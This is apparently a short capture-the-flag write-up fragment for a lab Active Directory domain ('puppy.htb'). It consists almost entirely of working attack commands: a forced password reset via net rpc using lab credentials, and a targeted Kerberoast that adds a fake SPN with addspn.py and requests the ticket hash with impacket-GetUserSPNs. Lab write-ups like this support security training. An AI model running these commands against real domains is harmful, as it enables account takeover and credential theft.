# Administrator - GenericAll / Set Fake SPN

### ForceChangePassword

```bash
net rpc password adam.silver 'examplePASS' -U puppy.htb/ant.edwards%'Antman2025!' -S 10.129.232.75
```

### Kerberoasting - Set Fake SPN for user

**1. addspn.py to add SPN to adam.silver**

**2. Get hash (Kerberoasting)**

```bash
python3 addspn.py -u 'puppy.htb\ant.edwards' -p 'Antman2025!' -t 'adam.silver' --target-type samname -s 'cifs/PUPPY.HTB' -dc-ip 10.129.1.138 10.129.1.138
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully

impacket-GetUserSPNs puppy.htb/ant.edwards:'Antman2025!' -dc-ip 10.129.1.138 -request
```
